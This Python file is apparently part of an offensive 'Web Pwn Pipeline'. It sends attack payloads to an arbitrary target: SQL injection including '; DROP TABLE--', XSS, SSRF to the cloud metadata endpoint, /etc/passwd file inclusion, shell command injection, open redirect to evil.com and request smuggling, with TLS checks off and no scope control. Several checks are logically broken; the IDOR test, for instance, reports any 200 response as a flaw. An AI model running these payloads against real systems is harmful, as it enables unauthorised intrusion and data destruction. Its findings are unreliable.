#!/usr/bin/env python3
"""
AXIOM DETECTION ENGINE — Phase 2 of Web Pwn Pipeline
Scans for vulnerabilities across all discovered endpoints.
"""

import os, sys, json, concurrent.futures, subprocess
from typing import Dict, List, Optional
from urllib.parse import urljoin

try:
    import requests
except ImportError:
    import urllib.request, urllib.error
    class requests:
        class Session:
            def get(self, url, **kwargs):
                req = urllib.request.Request(url)
                for k, v in kwargs.get('headers', {}).items():
                    req.add_header(k, v)
                try:
                    resp = urllib.request.urlopen(req, timeout=kwargs.get('timeout', 10))
                    return type('Response', (), {
                        'status_code': resp.getcode(),
                        'text': resp.read().decode('utf-8', errors='replace'),
                        'headers': dict(resp.info())
                    })()
                except Exception as e:
                    return type('Response', (), {'status_code': 0, 'text': str(e), 'headers': {}})


class DetectionEngine:
    """Scans for web vulnerabilities."""

    VULN_CHECKS = [
        "sql_injection",
        "cross_site_scripting",
        "ssrf",
        "open_redirect",
        "idor",
        "lfi",
        "ssti",
        "command_injection",
        "smuggling",
        "graphql_introspection"
    ]

    def __init__(self, target: str, output_dir: str,
                 recon_results: Dict, aggressive: bool = False,
                 cookie: str = None, proxy: str = None, timeout: int = 10):
        self.target = target
        self.output_dir = output_dir
        self.recon = recon_results
        self.aggressive = aggressive
        self.cookie = cookie
        self.proxy = proxy
        self.timeout = timeout
        self.session = requests.Session()
        self.vulnerabilities = []

    def run(self) -> List[Dict]:
        """Run all vulnerability checks."""
        print("  ┌─ Detection Phase")
        checks = self.VULN_CHECKS if self.aggressive else self.VULN_CHECKS[:6]
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
            futures = {ex.submit(getattr(self, f"_check_{c}")): c for c in checks}
            for f in concurrent.futures.as_completed(futures):
                name = futures[f]
                try:
                    result = f.result()
                    if result:
                        self.vulnerabilities.append(result)
                except Exception as e:
                    print(f"  ├─ [!] {name} check failed: {e}")
        self._save()
        print(f"  └─ Found {len(self.vulnerabilities)} vulnerabilities")
        return self.vulnerabilities

    def _request(self, url: str, method: str = "GET", **kwargs) -> Optional[object]:
        """Make HTTP request with error handling."""
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        if self.cookie:
            headers["Cookie"] = self.cookie
        try:
            kwargs.setdefault("timeout", self.timeout)
            kwargs.setdefault("headers", headers)
            kwargs.setdefault("verify", False)
            if method == "GET":
                return self.session.get(url, **kwargs)
            else:
                return self.session.post(url, **kwargs)
        except:
            return None

    def _check_sql_injection(self) -> Optional[Dict]:
        """Test for SQL injection with common payloads."""
        print("  ├─ SQL Injection scan...")
        payloads = ["'", "' OR '1'='1", "' UNION SELECT NULL--", "\"", "; DROP TABLE--"]
        indicators = ["sql", "mysql", "syntax error", "ora-", "unclosed quotation",
                       "microsoft ole db", "db error", "odbc"]
        for param in ["id", "page", "cat", "product", "user", "file", "order"]:
            for payload in payloads:
                url = f"{self.target}?{param}={payload}"
                r = self._request(url)
                if r and r.status_code in [500, 200]:
                    body = r.text.lower()
                    if any(ind in body for ind in indicators):
                        return {
                            "type": "sql_injection",
                            "url": url,
                            "param": param,
                            "payload": payload,
                            "severity": "critical",
                            "evidence": body[:200]
                        }
        return None

    def _check_cross_site_scripting(self) -> Optional[Dict]:
        """Test for reflected XSS."""
        print("  ├─ XSS scan...")
        payload = "<script>alert(1)</script>"
        test_url = f"{self.target}?q={payload}&search={payload}&s={payload}"
        r = self._request(test_url)
        if r and payload in r.text:
            return {
                "type": "cross_site_scripting",
                "url": test_url,
                "severity": "high",
                "evidence": r.text[:300]
            }
        return None

    def _check_ssrf(self) -> Optional[Dict]:
        """Test for SSRF via external callback detection."""
        print("  ├─ SSRF check...")
        payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:8080/",
            "http://127.0.0.1:22/",
            "http://[::1]:80/"
        ]
        for param in ["url", "path", "redirect", "file", "load", "fetch", "src"]:
            for payload in payloads:
                url = f"{self.target}?{param}={payload}"
                r = self._request(url)
                if r and r.status_code in [200, 301, 302] and (
                    "meta-data" in r.text or "localhost" in r.text or "root" in r.text):
                    return {
                        "type": "ssrf",
                        "url": url,
                        "param": param,
                        "severity": "critical",
                        "evidence": r.text[:200]
                    }
        return None

    def _check_open_redirect(self) -> Optional[Dict]:
        """Test for open redirect."""
        print("  ├─ Open redirect check...")
        test_target = "https://evil.com"
        payloads = [f"//{test_target}", f"https://{test_target}", f"http://{test_target}"]
        for param in ["next", "redirect", "url", "return", "dest", "target"]:
            for payload in payloads:
                url = f"{self.target}?{param}={payload}"
                r = self._request(url, allow_redirects=False)
                if r and r.status_code in [301, 302]:
                    loc = r.headers.get("Location", "")
                    if test_target in loc:
                        return {
                            "type": "open_redirect",
                            "url": url,
                            "severity": "medium",
                            "evidence": loc
                        }
        return None

    def _check_idor(self) -> Optional[Dict]:
        """Test for Insecure Direct Object References."""
        print("  ├─ IDOR check...")
        patterns = ["/user/", "/profile/", "/order/", "/invoice/", "/file/"]
        for pattern in patterns:
            for uid in [1001, 1002, 2001, 5000]:
                url = f"{self.target.rstrip('/')}{pattern}{uid}"
                r = self._request(url)
                if r and r.status_code == 200 and uid not in [1, 0]:
                    return {
                        "type": "idor",
                        "url": url,
                        "severity": "high",
                        "evidence": f"Accessed resource at {url} without auth"
                    }
        return None

    def _check_lfi(self) -> Optional[Dict]:
        """Test for Local File Inclusion."""
        print("  ├─ LFI check...")
        payloads = [
            "../../../etc/passwd", "../../etc/passwd", "../etc/passwd",
            "....//....//....//etc/passwd", "../../../../windows/win.ini"
        ]
        indicators = ["root:x:", "boot loader", "[fonts]", "[extensions]"]
        for payload in payloads:
            url = f"{self.target}?file={payload}&page={payload}&include={payload}"
            r = self._request(url)
            if r and any(ind in r.text for ind in indicators):
                return {
                    "type": "lfi",
                    "url": url,
                    "payload": payload,
                    "severity": "critical",
                    "evidence": r.text[:300]
                }
        return None

    def _check_ssti(self) -> Optional[Dict]:
        """Test for Server-Side Template Injection."""
        print("  ├─ SSTI check...")
        payload = "{{7*7}}"
        url = f"{self.target}?name={payload}&user={payload}"
        r = self._request(url)
        if r and "49" in r.text:
            return {
                "type": "ssti",
                "url": url,
                "severity": "critical",
                "evidence": "Template expression evaluated: 7*7=49"
            }
        return None

    def _check_command_injection(self) -> Optional[Dict]:
        """Test for command injection."""
        print("  ├─ Command injection check...")
        payloads = [
            ";id", "|id", "||id", "&id&", "$(id)", "`id`",
            ";ping -c 2 127.0.0.1", "|whoami"
        ]
        indicators = ["uid=", "gid=", "groups=", "root", "nt authority"]
        for param in ["host", "ip", "domain", "server", "cmd"]:
            for payload in payloads:
                url = f"{self.target}?{param}={payload}"
                r = self._request(url)
                if r and any(ind in r.text.lower() for ind in indicators):
                    return {
                        "type": "command_injection",
                        "url": url,
                        "payload": payload,
                        "severity": "critical",
                        "evidence": r.text[:200]
                    }
        return None

    def _check_smuggling(self) -> Optional[Dict]:
        """Basic HTTP request smuggling detection."""
        print("  ├─ HTTP smuggling check...")
        try:
            import socket
            host = self.target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
            port = 443 if "https" in self.target else 80

            # TE.CL detection
            payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Content-Length: 4\r\n\r\n"
                f"5c\r\nGPOST /\r\n0\r\n\r\n"
            )
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            if "https" in self.target:
                import ssl
                sock = ssl.wrap_socket(sock)
            sock.connect((host, port))
            sock.send(payload.encode())
            resp = sock.recv(4096).decode('utf-8', errors='replace')
            sock.close()

            if "GPOST" in resp or "unrecognized" in resp.lower():
                return {
                    "type": "http_smuggling",
                    "severity": "critical",
                    "evidence": "TE.CL smuggling detected"
                }
        except:
            pass
        return None

    def _check_graphql_introspection(self) -> Optional[Dict]:
        """Check if GraphQL introspection is enabled."""
        print("  ├─ GraphQL introspection check...")
        query = '{"query":"{ __schema { types { name } } }"}'
        endpoints = ["/graphql", "/v1/graphql", "/api/graphql", "/graph", "/query"]
        for ep in endpoints:
            url = f"{self.target.rstrip('/')}{ep}"
            r = self._request(url, method="POST", data=query,
                              headers={"Content-Type": "application/json"})
            if r and "data" in r.text and "__schema" in r.text:
                return {
                    "type": "graphql_introspection",
                    "url": url,
                    "severity": "high",
                    "evidence": "GraphQL introspection enabled"
                }
        return None

    def _save(self):
        path = f"{self.output_dir}/vulnerabilities.json"
        with open(path, "w") as f:
            json.dump(self.vulnerabilities, f, indent=2, default=str)
        print(f"  ├─ Saved: {path}")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="AXIOM Detection Engine")
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-o", "--output", default=".")
    args = parser.parse_args()
    engine = DetectionEngine(args.target, args.output, {})
    engine.run()
